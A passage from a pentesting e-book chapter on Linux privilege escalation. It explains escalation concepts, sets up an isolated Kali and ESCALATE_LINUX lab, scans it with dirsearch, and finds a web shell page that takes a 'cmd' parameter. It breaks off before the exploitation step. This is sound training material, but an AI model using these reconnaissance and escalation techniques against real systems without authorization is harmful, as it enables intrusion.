<html><head></head><body>
  <div id="_idContainer173">
   <h1 class="chapter-number" id="_idParaDest-177">
    <a id="_idTextAnchor317">
    </a>
    <span class="koboSpan" id="kobo.1.1">
     11
    </span>
   </h1>
   <h1 id="_idParaDest-178">
    <a id="_idTextAnchor318">
    </a>
    <span class="koboSpan" id="kobo.2.1">
     Privilege Escalation in the Bash Shell
    </span>
   </h1>
   <p>
    <strong class="bold">
     <span class="koboSpan" id="kobo.3.1">
      Privilege escalation
     </span>
    </strong>
    <span class="koboSpan" id="kobo.4.1">
     is a
    </span>
    <a id="_idIndexMarker662">
    </a>
    <span class="koboSpan" id="kobo.5.1">
     critical aspect of pentesting in Unix and Linux environments.
    </span>
    <span class="koboSpan" id="kobo.5.2">
     This chapter explores the techniques and methodologies for identifying and exploiting vulnerabilities that allow an attacker to elevate their privileges within a system.
    </span>
    <span class="koboSpan" id="kobo.5.3">
     We will focus on utilizing the Bash shell, a powerful tool present in most Unix-based systems, to execute various privilege
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.6.1">
      escalation strategies.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.7.1">
     Throughout this chapter, we will examine
    </span>
    <a id="_idIndexMarker663">
    </a>
    <span class="koboSpan" id="kobo.8.1">
     common
    </span>
    <strong class="bold">
     <span class="koboSpan" id="kobo.9.1">
      privilege escalation vectors
     </span>
    </strong>
    <span class="koboSpan" id="kobo.10.1">
     , develop Bash scripts for system enumeration, and analyze the exploitation of misconfigurations in services and scheduled tasks.
    </span>
    <span class="koboSpan" id="kobo.10.2">
     Special attention will be given to understanding and
    </span>
    <a id="_idIndexMarker664">
    </a>
    <span class="koboSpan" id="kobo.11.1">
     leveraging
    </span>
    <strong class="bold">
     <span class="koboSpan" id="kobo.12.1">
      Set User ID
     </span>
    </strong>
    <span class="koboSpan" id="kobo.13.1">
     (
    </span>
    <strong class="bold">
     <span class="koboSpan" id="kobo.14.1">
      SUID
     </span>
    </strong>
    <span class="koboSpan" id="kobo.15.1">
     ) and
    </span>
    <strong class="bold">
     <span class="koboSpan" id="kobo.16.1">
      Set Group ID
     </span>
    </strong>
    <span class="koboSpan" id="kobo.17.1">
     (
    </span>
    <strong class="bold">
     <span class="koboSpan" id="kobo.18.1">
      SGID
     </span>
    </strong>
    <span class="koboSpan" id="kobo.19.1">
     ) binaries, which
    </span>
    <a id="_idIndexMarker665">
    </a>
    <span class="koboSpan" id="kobo.20.1">
     often provide opportunities for privilege escalation.
    </span>
    <span class="koboSpan" id="kobo.20.2">
     By mastering these techniques, pentesters can effectively assess and improve the security posture of Unix and
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.21.1">
      Linux systems.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.22.1">
     We cover only the most common privilege escalation vectors in this chapter.
    </span>
    <span class="koboSpan" id="kobo.22.2">
     For an extensive list and a link to download the LinPEAS tool to automate these checks, visit the HackTricks website’s Linux privilege escalation checklist
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.23.1">
      at
     </span>
    </span>
    <a href="https://book.hacktricks.xyz/linux-hardening/linux-privilege-escalation-checklist">
     <span class="No-Break">
      <span class="koboSpan" id="kobo.24.1">
       https://book.hacktricks.xyz/linux-hardening/linux-privilege-escalation-checklist
      </span>
     </span>
    </a>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.25.1">
      .
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.26.1">
     Although the LinPEAS application will help find privilege escalation attack vectors for you, learning to do this manually will increasingly become more valuable as more Linux systems utilize some
    </span>
    <a id="_idIndexMarker666">
    </a>
    <span class="koboSpan" id="kobo.27.1">
     form of
    </span>
    <strong class="bold">
     <span class="koboSpan" id="kobo.28.1">
      Endpoint Detection and Response
     </span>
    </strong>
    <span class="koboSpan" id="kobo.29.1">
     (
    </span>
    <strong class="bold">
     <span class="koboSpan" id="kobo.30.1">
      EDR
     </span>
    </strong>
    <span class="koboSpan" id="kobo.31.1">
     ) protection agent.
    </span>
    <span class="koboSpan" id="kobo.31.2">
     These EDR agents may detect and block scripts such as LinPEAS, forcing you to run these
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.32.1">
      checks manually.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.33.1">
     In this chapter, we’re going to cover the following
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.34.1">
      main top
     </span>
     <a id="_idTextAnchor319">
     </a>
     <a id="_idTextAnchor320">
     </a>
     <span class="koboSpan" id="kobo.35.1">
      ics:
     </span>
    </span>
   </p>
   <ul>
    <li>
     <span class="koboSpan" id="kobo.36.1">
      Understanding privilege escalation in
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.37.1">
       Unix/Linux systems
      </span>
     </span>
    </li>
    <li>
     <span class="koboSpan" id="kobo.38.1">
      Enumeration techniques for
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.39.1">
       privilege escalation
      </span>
     </span>
    </li>
    <li>
     <span class="koboSpan" id="kobo.40.1">
      Exploiting SUID and SGID binaries
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.41.1">
       with
      </span>
      <a id="_idTextAnchor321">
      </a>
      <a id="_idTextAnchor322">
      </a>
      <span class="koboSpan" id="kobo.42.1">
       Bash
      </span>
     </span>
    </li>
    <li>
     <span class="koboSpan" id="kobo.43.1">
      Leveraging misconfigured services and
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.44.1">
       scheduled tasks
      </span>
     </span>
    </li>
   </ul>
   <h1 id="_idParaDest-179">
    <a id="_idTextAnchor323">
    </a>
    <span class="koboSpan" id="kobo.45.1">
     Technical requirements
    </span>
   </h1>
   <p>
    <span class="koboSpan" id="kobo.46.1">
     The code for this chapter can be found
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.47.1">
      at
     </span>
    </span>
    <a href="https://github.com/PacktPublishing/Bash-Shell-Scripting-for-Pentesters/tree/main/Chapter11">
     <span class="No-Break">
      <span class="koboSpan" id="kobo.48.1">
       https://github.com/PacktPublishing/Bash-Shell-Scripting-for-Pentesters/tree/main/Chapter11
      </span>
     </span>
    </a>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.49.1">
      .
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.50.1">
     If you want to follow along with the exercises, you should have a Kali virtual machine available, and will need to download and run the
    </span>
    <strong class="bold">
     <span class="koboSpan" id="kobo.51.1">
      ESCALATE_LINUX
     </span>
    </strong>
    <span class="koboSpan" id="kobo.52.1">
     virtual machine from
    </span>
    <a href="https://www.vulnhub.com/entry/escalate_linux-1,323/">
     <span class="koboSpan" id="kobo.53.1">
      https://www.vulnhub.com/entry/escalate_linux-1,323/
     </span>
    </a>
    <span class="koboSpan" id="kobo.54.1">
     .
    </span>
    <span class="koboSpan" id="kobo.54.2">
     Ensure that both the Kali and
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.55.1">
      ESCALATE_LINUX
     </span>
    </strong>
    <span class="koboSpan" id="kobo.56.1">
     virtual machines have the same virtual
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.57.1">
      network configuration.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.58.1">
     Run the following command to install prerequisite tools
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.59.1">
      in Kali:
     </span>
    </span>
   </p>
   <pre class="console"><span class="koboSpan" id="kobo.60.1">
$ sudo apt update &amp;&amp; sudo apt install -y dirsearch</span></pre>
   <h1 id="_idParaDest-180">
    <a id="_idTextAnchor324">
    </a>
    <span class="koboSpan" id="kobo.61.1">
     Understanding privilege escalation in Unix/Linux systems
    </span>
   </h1>
   <p>
    <span class="koboSpan" id="kobo.62.1">
     Privilege escalation
    </span>
    <a id="_idIndexMarker667">
    </a>
    <span class="koboSpan" id="kobo.63.1">
     in Unix/Linux systems refers to the process
    </span>
    <a id="_idIndexMarker668">
    </a>
    <span class="koboSpan" id="kobo.64.1">
     of gaining higher-level access rights than those initially granted to a user or application.
    </span>
    <span class="koboSpan" id="kobo.64.2">
     This concept is fundamental to system security and is a key focus for both system administrators
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.65.1">
      and
     </span>
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.66.1">
      pentest
     </span>
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.67.1">
      ers.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.68.1">
     In Unix/Linux environments, the privilege system is primarily based on user and group permissions.
    </span>
    <span class="koboSpan" id="kobo.68.2">
     The root user, with a user ID of
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.69.1">
      0
     </span>
    </strong>
    <span class="koboSpan" id="kobo.70.1">
     , has unrestricted access to the entire system.
    </span>
    <span class="koboSpan" id="kobo.70.2">
     Regular users have limited permissions, typically confined to their home directories and specific
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.71.1">
      system resources.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.72.1">
     Privilege escalation can be categorized into two
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.73.1">
      main types:
     </span>
    </span>
   </p>
   <ul>
    <li>
     <strong class="bold">
      <span class="koboSpan" id="kobo.74.1">
       Vertical privilege escalation
      </span>
     </strong>
     <span class="koboSpan" id="kobo.75.1">
      : This involves
     </span>
     <a id="_idIndexMarker669">
     </a>
     <span class="koboSpan" id="kobo.76.1">
      elevating privileges from a lower-level user to a higher-level user, often targeting root access.
     </span>
     <span class="koboSpan" id="kobo.76.2">
      An example is a standard user gaining
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.77.1">
       root privileges.
      </span>
     </span>
    </li>
    <li>
     <strong class="bold">
      <span class="koboSpan" id="kobo.78.1">
       Horizontal privilege escalation
      </span>
     </strong>
     <span class="koboSpan" id="kobo.79.1">
      : This occurs when a user gains access to resources or performs actions that should be restricted to a different user of the same privilege level.
     </span>
     <span class="koboSpan" id="kobo.79.2">
      An example is one standard user accessing another standard
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.80.1">
       user’s files.
      </span>
     </span>
    </li>
   </ul>
   <p>
    <span class="koboSpan" id="kobo.81.1">
     Common paths for privilege escalation in Unix/Linux systems include
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.82.1">
      the following:
     </span>
    </span>
   </p>
   <ul>
    <li>
     <span class="koboSpan" id="kobo.83.1">
      Exploiting vulnerabilities in system services
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.84.1">
       or applications
      </span>
     </span>
    </li>
    <li>
     <span class="koboSpan" id="kobo.85.1">
      Misconfigurations in file or
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.86.1">
       directory permissions
      </span>
     </span>
    </li>
    <li>
     <span class="koboSpan" id="kobo.87.1">
      Weak password policies or
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.88.1">
       compromised credentials
      </span>
     </span>
    </li>
    <li>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.89.1">
       Kernel exploits
      </span>
     </span>
    </li>
    <li>
     <span class="koboSpan" id="kobo.90.1">
      Unpatched
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.91.1">
       software vulnerabilities
      </span>
     </span>
    </li>
   </ul>
   <p>
    <span class="koboSpan" id="kobo.92.1">
     Before we get into the details of the common paths for privilege escalation, it is essential that we first review the Unix/Linux permission model.
    </span>
    <span class="koboSpan" id="kobo.92.2">
     Understanding the
    </span>
    <strong class="bold">
     <span class="koboSpan" id="kobo.93.1">
      Unix/Linux permission model
     </span>
    </strong>
    <span class="koboSpan" id="kobo.94.1">
     is
    </span>
    <a id="_idIndexMarker670">
    </a>
    <span class="koboSpan" id="kobo.95.1">
     essential for grasping privilege
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.96.1">
      escalation concepts:
     </span>
    </span>
   </p>
   <ul>
    <li>
     <span class="koboSpan" id="kobo.97.1">
      File permissions are represented by read (
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.98.1">
       r
      </span>
     </strong>
     <span class="koboSpan" id="kobo.99.1">
      ), write (
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.100.1">
       w
      </span>
     </strong>
     <span class="koboSpan" id="kobo.101.1">
      ), and execute (
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.102.1">
       x
      </span>
     </strong>
     <span class="koboSpan" id="kobo.103.1">
      ) flags for the owner, group,
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.104.1">
       and others
      </span>
     </span>
    </li>
    <li>
     <span class="koboSpan" id="kobo.105.1">
      Special permissions such as
     </span>
     <strong class="bold">
      <span class="koboSpan" id="kobo.106.1">
       SUID
      </span>
     </strong>
     <span class="koboSpan" id="kobo.107.1">
      ,
     </span>
     <strong class="bold">
      <span class="koboSpan" id="kobo.108.1">
       SGID
      </span>
     </strong>
     <span class="koboSpan" id="kobo.109.1">
      , and
     </span>
     <strong class="bold">
      <span class="koboSpan" id="kobo.110.1">
       Sticky Bit
      </span>
     </strong>
     <span class="koboSpan" id="kobo.111.1">
      can
     </span>
     <a id="_idIndexMarker671">
     </a>
     <span class="koboSpan" id="kobo.112.1">
      also impact
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.113.1">
       privilege levels
      </span>
     </span>
    </li>
    <li>
     <span class="koboSpan" id="kobo.114.1">
      User and group management, including the
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.115.1">
       /etc/passwd
      </span>
     </strong>
     <span class="koboSpan" id="kobo.116.1">
      and
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.117.1">
       /etc/shadow
      </span>
     </strong>
     <span class="koboSpan" id="kobo.118.1">
      files, play a role in
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.119.1">
       access control
      </span>
     </span>
    </li>
   </ul>
   <p>
    <span class="koboSpan" id="kobo.120.1">
     Privilege
    </span>
    <a id="_idIndexMarker672">
    </a>
    <span class="koboSpan" id="kobo.121.1">
     escalation
    </span>
    <a id="_idIndexMarker673">
    </a>
    <span class="koboSpan" id="kobo.122.1">
     techniques often involve a combination of information gathering, vulnerability identification, and exploitation.
    </span>
    <span class="koboSpan" id="kobo.122.2">
     Attackers may chain multiple vulnerabilities or misconfigurations to gradually increase their
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.123.1">
      access levels.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.124.1">
     It’s important to note that privilege escalation is not inherently malicious.
    </span>
    <span class="koboSpan" id="kobo.124.2">
     System administrators and security professionals use these techniques to identify and address security weaknesses.
    </span>
    <span class="koboSpan" id="kobo.124.3">
     However, in the hands of malicious actors, privilege escalation can lead to unauthorized access, data breaches, and
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.125.1">
      system compromise.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.126.1">
     Preventive measures against unintended privilege escalation include
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.127.1">
      the following:
     </span>
    </span>
   </p>
   <ul>
    <li>
     <span class="koboSpan" id="kobo.128.1">
      Regular system updates and
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.129.1">
       patch management
      </span>
     </span>
    </li>
    <li>
     <span class="koboSpan" id="kobo.130.1">
      Proper configuration of file and
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.131.1">
       directory permissions
      </span>
     </span>
    </li>
    <li>
     <span class="koboSpan" id="kobo.132.1">
      Implementation of the principle of
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.133.1">
       least privilege
      </span>
     </span>
    </li>
    <li>
     <span class="koboSpan" id="kobo.134.1">
      Use of
     </span>
     <strong class="bold">
      <span class="koboSpan" id="kobo.135.1">
       security-enhanced Linux
      </span>
     </strong>
     <span class="koboSpan" id="kobo.136.1">
      (
     </span>
     <strong class="bold">
      <span class="koboSpan" id="kobo.137.1">
       SELinux
      </span>
     </strong>
     <span class="koboSpan" id="kobo.138.1">
      )
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.139.1">
       or
      </span>
     </span>
     <span class="No-Break">
      <strong class="bold">
       <span class="koboSpan" id="kobo.140.1">
        AppArmor
       </span>
      </strong>
     </span>
    </li>
    <li>
     <span class="koboSpan" id="kobo.141.1">
      Regular security audits and
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.142.1">
       vulnerability assessments
      </span>
     </span>
    </li>
   </ul>
   <p>
    <span class="koboSpan" id="kobo.143.1">
     Understanding
    </span>
    <a id="_idIndexMarker674">
    </a>
    <span class="koboSpan" id="kobo.144.1">
     privilege
    </span>
    <a id="_idIndexMarker675">
    </a>
    <span class="koboSpan" id="kobo.145.1">
     escalation is critical for both defending against and conducting pentests on Unix/Linux systems.
    </span>
    <span class="koboSpan" id="kobo.145.2">
     It forms the foundation for more advanced techniques and exploits
    </span>
    <a id="_idIndexMarker676">
    </a>
    <span class="koboSpan" id="kobo.146.1">
     that
    </span>
    <a id="_idIndexMarker677">
    </a>
    <span class="koboSpan" id="kobo.147.1">
     will be explored in subsequent sections of
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.148.1">
      this chapter.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.149.1">
     The next section will explore how to
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.150.1">
      perform enumeration.
     </span>
    </span>
   </p>
   <h1 id="_idParaDest-181">
    <a id="_idTextAnchor325">
    </a>
    <span class="koboSpan" id="kobo.151.1">
     Enumeration techniques for privilege escalation
    </span>
   </h1>
   <p>
    <strong class="bold">
     <span class="koboSpan" id="kobo.152.1">
      Enumeration
     </span>
    </strong>
    <span class="koboSpan" id="kobo.153.1">
     is a key
    </span>
    <a id="_idIndexMarker678">
    </a>
    <span class="koboSpan" id="kobo.154.1">
     phase in privilege
    </span>
    <a id="_idIndexMarker679">
    </a>
    <span class="koboSpan" id="kobo.155.1">
     escalation, allowing pentesters to gather information about the target system.
    </span>
    <span class="koboSpan" id="kobo.155.2">
     This section focuses on Bash commands and techniques for effective system enumeration for
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.156.1">
      privilege escalation.
     </span>
    </span>
   </p>
   <h2 id="_idParaDest-182">
    <a id="_idTextAnchor326">
    </a>
    <span class="koboSpan" id="kobo.157.1">
     Initial access
    </span>
   </h2>
   <p>
    <span class="koboSpan" id="kobo.158.1">
     This section will precede
    </span>
    <a id="_idIndexMarker680">
    </a>
    <span class="koboSpan" id="kobo.159.1">
     privilege escalation.
    </span>
    <span class="koboSpan" id="kobo.159.2">
     It covers connecting to the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.160.1">
      ESCALATE_LINUX
     </span>
    </strong>
    <span class="koboSpan" id="kobo.161.1">
     virtual machine, which we’ll call the
    </span>
    <em class="italic">
     <span class="koboSpan" id="kobo.162.1">
      target
     </span>
    </em>
    <span class="koboSpan" id="kobo.163.1">
     for the remainder of this chapter.
    </span>
    <span class="koboSpan" id="kobo.163.2">
     Once we have established a working shell, we’ll move forward into
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.164.1">
      subsequent sections.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.165.1">
     In this exercise, I have both the Kali and the target running in VirtualBox virtual machines.
    </span>
    <span class="koboSpan" id="kobo.165.2">
     Both Kali and
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.166.1">
      ESCALATE_LINUX
     </span>
    </strong>
    <span class="koboSpan" id="kobo.167.1">
     offer virtual machine OVA files that can be downloaded and imported
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.168.1">
      into VirtualBox.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.169.1">
     The network interfaces are configured to use the host-only network adapter, as shown in the
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.170.1">
      following figure:
     </span>
    </span>
   </p>
   <div>
    <div class="IMG---Figure" id="_idContainer131">
     <span class="koboSpan" id="kobo.171.1">
      <img alt="Figure 11.1 – The virtual network interface configuration" src="image/B22229_11_01.jpg"/>
     </span>
    </div>
   </div>
   <p class="IMG---Caption" lang="en-US" xml:lang="en-US">
    <span class="koboSpan" id="kobo.172.1">
     Figure 11.1 – The virtual network interface configuration
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.173.1">
     The Kali virtual
    </span>
    <a id="_idIndexMarker681">
    </a>
    <span class="koboSpan" id="kobo.174.1">
     machine should have an additional virtual network interface added.
    </span>
    <span class="koboSpan" id="kobo.174.2">
     Of the two Kali virtual network interfaces, one should be in
    </span>
    <strong class="bold">
     <span class="koboSpan" id="kobo.175.1">
      Host-only
     </span>
    </strong>
    <span class="koboSpan" id="kobo.176.1">
     mode, and the other should be in
    </span>
    <strong class="bold">
     <span class="koboSpan" id="kobo.177.1">
      Bridged
     </span>
    </strong>
    <span class="koboSpan" id="kobo.178.1">
     mode, as shown in the
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.179.1">
      following screenshot:
     </span>
    </span>
   </p>
   <div>
    <div class="IMG---Figure" id="_idContainer132">
     <span class="koboSpan" id="kobo.180.1">
      <img alt="Figure 11.2 – The Kali VirtualBox network interface configuration" src="image/B22229_11_02.jpg"/>
     </span>
    </div>
   </div>
   <p class="IMG---Caption" lang="en-US" xml:lang="en-US">
    <span class="koboSpan" id="kobo.181.1">
     Figure 11.2 – The Kali VirtualBox network interface configuration
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.182.1">
     This configuration will keep the vulnerable target system isolated from the network while allowing the Kali system to connect to the internet to download any
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.183.1">
      needed tools.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.184.1">
     If you have any trouble identifying which of Kali’s network interfaces are connected to each network mode, the command output shown in the following figure should help you figure
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.185.1">
      this out:
     </span>
    </span>
   </p>
   <div>
    <div class="IMG---Figure" id="_idContainer133">
     <span class="koboSpan" id="kobo.186.1">
      <img alt="Figure 11.3 – Enumerating virtual network interfaces" src="image/B22229_11_03.jpg"/>
     </span>
    </div>
   </div>
   <p class="IMG---Caption" lang="en-US" xml:lang="en-US">
    <span class="koboSpan" id="kobo.187.1">
     Figure 11.3 – Enumerating virtual network interfaces
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.188.1">
     The Kali VirtualBox virtual machine downloaded from Offensive Security (
    </span>
    <a href="https://cdimage.kali.org/kali-2024.2/kali-linux-2024.2-virtualbox-amd64.7z">
     <span class="koboSpan" id="kobo.189.1">
      https://cdimage.kali.org/kali-2024.2/kali-linux-2024.2-virtualbox-amd64.7z
     </span>
    </a>
    <span class="koboSpan" id="kobo.190.1">
     ) already has the guest extensions installed, which will allow you to query the network interfaces to find their IP addresses.
    </span>
    <span class="koboSpan" id="kobo.190.2">
     In the preceding figure, the first
    </span>
    <strong class="bold">
     <span class="koboSpan" id="kobo.191.1">
      Network Interface Card
     </span>
    </strong>
    <span class="koboSpan" id="kobo.192.1">
     (
    </span>
    <strong class="bold">
     <span class="koboSpan" id="kobo.193.1">
      NIC
     </span>
    </strong>
    <span class="koboSpan" id="kobo.194.1">
     ) is
    </span>
    <a id="_idIndexMarker682">
    </a>
    <span class="koboSpan" id="kobo.195.1">
     configured for
    </span>
    <strong class="bold">
     <span class="koboSpan" id="kobo.196.1">
      Host-only
     </span>
    </strong>
    <span class="koboSpan" id="kobo.197.1">
     access, as is the target system.
    </span>
    <span class="koboSpan" id="kobo.197.2">
     Unfortunately, the target system doesn’t have VirtualBox guest extensions installed; therefore, we cannot query for its IP address information and will have to rely
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.198.1">
      on Kali.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.199.1">
     Moreover, the
    </span>
    <a id="_idIndexMarker683">
    </a>
    <span class="koboSpan" id="kobo.200.1">
     second and third commands in the preceding figure differ only in the number of the virtual interface.
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.201.1">
      NI
     </span>
     <a id="_idTextAnchor327">
     </a>
     <a id="_idTextAnchor328">
     </a>
     <span class="koboSpan" id="kobo.202.1">
      C 1
     </span>
    </strong>
    <span class="koboSpan" id="kobo.203.1">
     corresponds to
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.204.1">
      /VirtualBox/GuestInfo/Net/0/V4/IP
     </span>
    </strong>
    <span class="koboSpan" id="kobo.205.1">
     , and
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.206.1">
      NIC 2
     </span>
    </strong>
    <span class="koboSpan" id="kobo.207.1">
     corresponds to
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.208.1">
      /VirtualBox/GuestInfo/Net/1/V4/IP
     </span>
    </strong>
    <span class="koboSpan" id="kobo.209.1">
     .
    </span>
    <span class="koboSpan" id="kobo.209.2">
     Since
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.210.1">
      NIC 1
     </span>
    </strong>
    <span class="koboSpan" id="kobo.211.1">
     is configured for
    </span>
    <strong class="bold">
     <span class="koboSpan" id="kobo.212.1">
      Host-only
     </span>
    </strong>
    <span class="koboSpan" id="kobo.213.1">
     and has an IP address of
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.214.1">
      192.168.56.101
     </span>
    </strong>
    <span class="koboSpan" id="kobo.215.1">
     , we can guess that the target system is also found on this network.
    </span>
    <span class="koboSpan" id="kobo.215.2">
     Next, let’s scan that network to find an IP address with TCP port
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.216.1">
      80
     </span>
    </strong>
    <span class="koboSpan" id="kobo.217.1">
     (HTTP) listening, as
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.218.1">
      shown here:
     </span>
    </span>
   </p>
   <div>
    <div class="IMG---Figure" id="_idContainer134">
     <span class="koboSpan" id="kobo.219.1">
      <img alt="Figure 11.4 – Scanning the network to locate HTTP servers" src="image/B22229_11_04.jpg"/>
     </span>
    </div>
   </div>
   <p class="IMG---Caption" lang="en-US" xml:lang="en-US">
    <span class="koboSpan" id="kobo.220.1">
     Figure 11.4 – Scanning the network to locate HTTP servers
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.221.1">
     If we visit that address in our web browser, we find an Apache2 default page,
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.222.1">
      as shown:
     </span>
    </span>
   </p>
   <div>
    <div class="IMG---Figure" id="_idContainer135">
     <span class="koboSpan" id="kobo.223.1">
      <img alt="Figure 11.5 – A default Apache2 page" src="image/B22229_11_05.jpg"/>
     </span>
    </div>
   </div>
   <p class="IMG---Caption" lang="en-US" xml:lang="en-US">
    <span class="koboSpan" id="kobo.224.1">
     Figure 11.5 – A default Apache2 page
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.225.1">
     Since we’ve found only a default website, we need to check for additional web content.
    </span>
    <span class="koboSpan" id="kobo.225.2">
     Run the following
    </span>
    <span class="No-Break">
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.226.1">
       dirsearch
      </span>
     </strong>
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.227.1">
      command:
     </span>
    </span>
   </p>
   <pre class="console"><span class="koboSpan" id="kobo.228.1">
$ dirsearch -u http://192.168.56.102</span></pre>
   <p>
    <span class="koboSpan" id="kobo.229.1">
     The output reveals
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.230.1">
      shell.php
     </span>
    </strong>
    <span class="koboSpan" id="kobo.231.1">
     , as shown in the
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.232.1">
      following figure:
     </span>
    </span>
   </p>
   <div>
    <div class="IMG---Figure" id="_idContainer136">
     <span class="koboSpan" id="kobo.233.1">
      <img alt="Figure 11.6 – A valid PHP web page is located" src="image/B22229_11_06.jpg"/>
     </span>
    </div>
   </div>
   <p class="IMG---Caption" lang="en-US" xml:lang="en-US">
    <span class="koboSpan" id="kobo.234.1">
     Figure 11.6 – A valid PHP web page is located
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.235.1">
     If we visit
    </span>
    <a href="https://192.168.56.102/shell.php">
     <span class="koboSpan" id="kobo.236.1">
      https://192.168.56.102/shell.php
     </span>
    </a>
    <span class="koboSpan" id="kobo.237.1">
     in a web browser on Kali, we see the following text on the
    </span>
    <a id="_idIndexMarker684">
    </a>
    <span class="koboSpan" id="kobo.238.1">
     web page:
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.239.1">
      /*pass cmd as
     </span>
    </strong>
    <span class="No-Break">
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.240.1">
       get parameter*/
      </span>
     </strong>
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.241.1">
      .
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.242.1">
     This is a huge hint that we won’t ordinarily get, so keep in mind that we’ve been given a shortcut to finding the vulnerability so that we can spend our precious time focusing on privilege escalation, which is what the target was
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.243.1">
      intended for.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.244.1">
     The following figure shows how to properly exploit this
    </span>
    <span class="No-Break">
